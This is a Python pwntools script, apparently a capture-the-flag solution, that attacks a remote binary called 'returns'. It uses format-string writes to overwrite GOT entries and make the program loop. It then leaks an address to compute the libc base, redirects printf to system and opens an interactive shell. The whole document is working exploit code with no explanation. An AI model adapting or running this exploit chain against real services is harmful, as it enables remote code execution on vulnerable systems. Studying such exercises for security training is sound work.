from pwn import *

libc = ELF('libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
print hex(libc.symbols['system'])

host = 'shell.actf.co'
port = 19307

p = process('./returns')
p = remote(host, port)

# create loop
payload = ''
payload += '%4518c%11$hnn'
payload = payload.ljust(24, '\x00')
payload += p64(0x404018)
p.sendline(payload)
#print p.recvuntil('')

# leak address
payload = ''
payload += '>%29$p<'
p.sendline(payload)
p.recvuntil('>')
addr = p.recvuntil('<')[:-1]
print p.recvuntil('you.')
'''
handle address
+ cal libcbase
+ cal address system
'''
pause()
libcBase = int(addr, 16) - libc.symbols['__libc_start_main'] - 231 - 9
print 'libcBase: ' + hex(libcBase)
system = libcBase + libc.symbols['system']
print 'system addr: ' + hex(system)

#exploit
x1 = int(str(hex(system))[-4:], 16) # last 2 bytes
x2 = int(str(hex(system))[-8:-4], 16) # 2 bytes next
payload = ''
payload += 'sh;' # system(sh;)
x1 = x1 - len(payload)
payload += '%{}c%12$hn'.format(x1)
x2 = x2 - x1 - 3
if x2 < 0:
	x2 += 0x10000
payload += '%{}c%13$hnn'.format(x2)
payload = payload.ljust(32, '\x00')
payload += p64(0x404038) # got printf: override the last 2 bytes
payload += p64(0x40403a) # override 2 bytes next
print payload
p.sendline(payload)
#p.recvuntil('')
raw_input()
p.interactive()
#0x7ffff7a33440